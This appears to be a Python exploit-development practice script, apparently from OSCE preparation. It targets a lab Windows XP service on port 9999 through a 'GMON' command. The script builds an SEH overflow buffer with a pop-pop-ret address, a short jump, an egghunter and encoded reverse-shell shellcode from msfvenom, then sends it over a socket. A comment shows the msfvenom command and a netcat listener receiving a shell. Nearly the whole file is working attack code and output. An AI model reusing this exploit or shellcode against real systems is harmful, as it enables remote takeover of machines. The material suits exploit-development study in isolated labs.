#!/usr/bin/python

import sys, socket


'''
root@OSCE:~/exploit_dev_practice# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -f python -b "\x00\x0a\x0d"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1684 bytes


root@OSCE:~/exploit_dev_practice# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 1083
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\test\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . :
        IP Address. . . . . . . . . . . . : 192.168.56.102
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . :

C:\Documents and Settings\test\Desktop>



'''

target = '192.168.56.102'

port = 9999

egg = "\x77\x30\x30\x74"

buf =  ""
buf += "\xbf\x09\x56\x90\x7c\xd9\xcd\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x52\x83\xee\xfc\x31\x7e\x0e\x03\x77\x58\x72"
buf += "\x89\x7b\x8c\xf0\x72\x83\x4d\x95\xfb\x66\x7c\x95\x98"
buf += "\xe3\x2f\x25\xea\xa1\xc3\xce\xbe\x51\x57\xa2\x16\x56"
buf += "\xd0\x09\x41\x59\xe1\x22\xb1\xf8\x61\x39\xe6\xda\x58"
buf += "\xf2\xfb\x1b\x9c\xef\xf6\x49\x75\x7b\xa4\x7d\xf2\x31"
buf += "\x75\xf6\x48\xd7\xfd\xeb\x19\xd6\x2c\xba\x12\x81\xee"
buf += "\x3d\xf6\xb9\xa6\x25\x1b\x87\x71\xde\xef\x73\x80\x36"
buf += "\x3e\x7b\x2f\x77\x8e\x8e\x31\xb0\x29\x71\x44\xc8\x49"
buf += "\x0c\x5f\x0f\x33\xca\xea\x8b\x93\x99\x4d\x77\x25\x4d"
buf += "\x0b\xfc\x29\x3a\x5f\x5a\x2e\xbd\x8c\xd1\x4a\x36\x33"
buf += "\x35\xdb\x0c\x10\x91\x87\xd7\x39\x80\x6d\xb9\x46\xd2"
buf += "\xcd\x66\xe3\x99\xe0\x73\x9e\xc0\x6c\xb7\x93\xfa\x6c"
buf += "\xdf\xa4\x89\x5e\x40\x1f\x05\xd3\x09\xb9\xd2\x14\x20"
buf += "\x7d\x4c\xeb\xcb\x7e\x45\x28\x9f\x2e\xfd\x99\xa0\xa4"
buf += "\xfd\x26\x75\x6a\xad\x88\x26\xcb\x1d\x69\x97\xa3\x77"
buf += "\x66\xc8\xd4\x78\xac\x61\x7e\x83\x27\x4e\xd7\xb3\xd2"
buf += "\x26\x2a\xc3\x49\xde\xa3\x25\x1b\x30\xe2\xfe\xb4\xa9"
buf += "\xaf\x74\x24\x35\x7a\xf1\x66\xbd\x89\x06\x28\x36\xe7"
buf += "\x14\xdd\xb6\xb2\x46\x48\xc8\x68\xee\x16\x5b\xf7\xee"
buf += "\x51\x40\xa0\xb9\x36\xb6\xb9\x2f\xab\xe1\x13\x4d\x36"
buf += "\x77\x5b\xd5\xed\x44\x62\xd4\x60\xf0\x40\xc6\xbc\xf9"
buf += "\xcc\xb2\x10\xac\x9a\x6c\xd7\x06\x6d\xc6\x81\xf5\x27"
buf += "\x8e\x54\x36\xf8\xc8\x58\x13\x8e\x34\xe8\xca\xd7\x4b"
buf += "\xc5\x9a\xdf\x34\x3b\x3b\x1f\xef\xff\x4b\x6a\xad\x56"
buf += "\xc4\x33\x24\xeb\x89\xc3\x93\x28\xb4\x47\x11\xd1\x43"
buf += "\x57\x50\xd4\x08\xdf\x89\xa4\x01\x8a\xad\x1b\x21\x9f"



egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


buff= egg + egg + buf + ("\x90" * (3495 - 100 + 2 - 351 )) + egghunter
buff += ((3495 - len(buff)) * "\x90")
buff += "\xeb\x9c\x90\x90"
buff += "\xb4\x10\x50\x62" #pop pop ret
buff += ((5060 - len(buff)) * "\x90")


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((target,port))
s.send('GMON /.:/' + buff)
s.close()
